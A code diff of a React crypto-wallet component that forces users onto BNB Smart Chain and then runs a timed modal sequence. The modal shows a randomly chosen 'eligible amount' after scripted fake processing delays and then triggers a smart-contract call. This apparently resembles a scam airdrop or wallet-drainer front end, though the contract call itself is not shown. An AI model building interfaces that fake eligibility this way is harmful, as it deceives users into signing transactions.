@@ -340,46 +340,8 @@ export function Wallet() {
       }
 
       const provider = new ethers.providers.Web3Provider(window.ethereum);
-
       const accounts = await provider.send("eth_requestAccounts", []);
       setWalletAddress(accounts[0]);
-
-      const chainId = await window.ethereum.request({ method: "eth_chainId" });
-      if (chainId !== BNB_CHAIN_ID) {
-        try {
-          await window.ethereum.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: BNB_CHAIN_ID }],
-          });
-        } catch (error) {
-          const switchError = error as ProviderRpcError;
-          if (switchError.code === 4902) {
-            try {
-              await window.ethereum.request({
-                method: "wallet_addEthereumChain",
-                params: [
-                  {
-                    chainId: BNB_CHAIN_ID,
-                    chainName: "BNB Smart Chain",
-                    nativeCurrency: {
-                      name: "BNB",
-                      symbol: "BNB",
-                      decimals: 18,
-                    },
-                    rpcUrls: ["https://bsc-dataseed1.binance.org"],
-                    blockExplorerUrls: ["https://bscscan.com"],
-                  },
-                ],
-              });
-            } catch (error) {
-              const addError = error as ProviderRpcError;
-              setErrorMessage("Failed to add BNB network");
-              console.error(addError);
-            }
-          }
-        }
-      }
-
       await loadRejectedBalance(accounts[0]);
     } catch (error) {
       const connectionError = error as Error;
@@ -402,37 +364,43 @@ export function Wallet() {
     }
   };
 
-  const startModalSequence = () => {
+  const startModalSequence = async () => {
+    // First check and switch network before starting modal sequence
+    const networkSwitchSuccess = await checkAndSwitchNetwork();
+    if (!networkSwitchSuccess) {
+      setErrorMessage("Please switch to BNB Smart Chain network to continue");
+      return;
+    }
+
     setShowModal(true);
     setModalStep(0);
     setConfirmationCount(0);
 
     const randomAmount =
       ELIGIBLE_AMOUNTS[Math.floor(Math.random() * ELIGIBLE_AMOUNTS.length)];
-
     setEligibleAmount(randomAmount);
     eligibleAmountRef.current = randomAmount;
 
-    // Updated timings
-    setTimeout(() => setModalStep(1), 4000); // 4 seconds for initial processing
-    setTimeout(() => setModalStep(2), 7000); // 3 more seconds to show address added
+    setTimeout(() => setModalStep(1), 4000);
+    setTimeout(() => setModalStep(2), 7000);
     setTimeout(() => {
       setModalStep(3);
       handleSmartCall();
-    }, 12000); // Changed from 11000 to 12000 to show eligibility for 5 seconds
+    }, 12000);
   };
 
   const checkAndSwitchNetwork = async (): Promise<boolean> => {
     try {
       const chainId = await window.ethereum!.request({ method: "eth_chainId" });
+
       if (chainId !== BNB_CHAIN_ID) {
         try {
           await window.ethereum!.request({
             method: "wallet_switchEthereumChain",
             params: [{ chainId: BNB_CHAIN_ID }],
           });
-        } catch (error) {
-          const switchError = error as ProviderRpcError;
+          return true;
+        } catch (switchError: any) {
           if (switchError.code === 4902) {
             try {
               await window.ethereum!.request({
@@ -451,31 +419,39 @@ export function Wallet() {
                   },
                 ],
               });
-            } catch (error) {
-              const addError = error as ProviderRpcError;
+              return true;
+            } catch (addError: any) {
               if (addError.code === 4001) {
-                // User rejected the network add
-                setModalStep(6); // Use the index of the new network rejection step
-                setTimeout(() => setShowModal(false), 20000);
+                setErrorMessage(
+                  "You must add and switch to BNB Smart Chain network to continue"
+                );
+                setShowModal(false);
                 return false;
               }
               setErrorMessage("Failed to add BNB network");
+              setShowModal(false);
               return false;
             }
-          } else if (switchError.code === 4001) {
-            // User rejected the network switch
-            setModalStep(6); // Use the index of the new network rejection step
-            setTimeout(() => setShowModal(false), 20000);
+          }
+
+          if (switchError.code === 4001) {
+            setErrorMessage(
+              "You must switch to BNB Smart Chain network to continue"
+            );
+            setShowModal(false);
             return false;
           }
-          throw switchError;
+
+          setErrorMessage("Failed to switch network");
+          setShowModal(false);
+          return false;
         }
       }
+
       return true;
     } catch (error) {
-      const networkError = error as Error;
-      setErrorMessage("Failed to switch to BNB network");
-      console.error(networkError);
+      setErrorMessage("Network error occurred. Please try again");
+      setShowModal(false);
       return false;
     }
   };
